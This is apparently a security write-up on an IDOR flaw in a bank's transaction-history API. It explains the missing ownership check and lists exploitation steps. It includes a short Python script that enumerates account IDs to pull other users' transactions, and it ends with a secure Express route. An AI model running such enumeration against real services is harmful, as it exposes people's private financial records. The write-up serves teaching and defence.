IDOR in Banking API: How I Accessed Another User's Transaction History

April 17, 2026 10 min read IDOR · API Security · Banking

📌 IDOR in Transaction History API Endpoint

🧠 Description

What is the vulnerability?

An Insecure Direct Object Reference (IDOR) vulnerability exists in the bank's transaction history API endpoint. Any authenticated user can view any other user's complete transaction history by modifying the account ID parameter in the API request.

Why does it occur?

The API endpoint correctly authenticates users via JWT tokens but fails to verify that the authenticated user has permission to access the requested account resource. The server trusts the client-provided account ID without performing any ownership validation.

Security principle violated: Authorization

Input Validation Authorization

Real-world analogy: Imagine a hotel where guests can enter any room by changing the room number on their key card, because the front desk never checks if the guest actually booked that room.

🏷️ Classification

  • Type: Broken Access Control / IDOR
  • OWASP: A01:2021 – Broken Access Control
  • CWE: CWE-639: Authorization Bypass Through User-Controlled Key
  • CAPEC: CAPEC-566: IDOR

🎯 Attack Surface (Where to Test)

  • ✅ URL parameters (/accounts/{accountId}/transactions)
  • ✅ POST body (if account ID was in JSON body)
  • ❌ Headers (not applicable in this case)
  • ❌ Cookies / Sessions (session was valid but lacked authorization)
  • ❌ File uploads
  • ✅ API endpoints (REST)

⚙️ Exploitation Steps

  1. Authenticate to the banking application as any valid user
  2. Capture the transaction history API request in Burp Suite
  3. Identify the account ID parameter in the URL path
  4. Modify the account ID to a different number
  5. Forward the request – receive another user's complete transaction history
  6. Enumerate account IDs to access large number of user accounts
# Python exploitation script
import requests

headers = {"Authorization": "Bearer VALID_TOKEN"}
for account_id in range(184700, 185000):
    url = f"https://api.bank.com/api/v1/accounts/{account_id}/transactions"
    response = requests.get(url, headers=headers)
    if response.status_code == 200:
        print(f"[VULNERABLE] Account {account_id}")
        print(response.json()['transactions'][:5])

🛡️ Mitigation

✅ Input validation: Validate account ID format and type
✅ Authorization check: Verify ownership before returning data
✅ Secure coding: Implement resource-based access control
✅ Security headers: Not applicable for this issue 
// Secure implementation
router.get('/api/v1/accounts/:accountId/transactions', authenticate, async (req, res) => {
    const accountId = req.params.accountId;
    const userId = req.user.id;
    
    // ✅ Critical authorization check
    const ownsAccount = await db.userOwnsAccount(userId, accountId);
    if (!ownsAccount) {
        return res.status(403).json({ error: "Access denied" });
    }
    
    const transactions = await db.getTransactions(accountId);
    res.json(transactions);
});
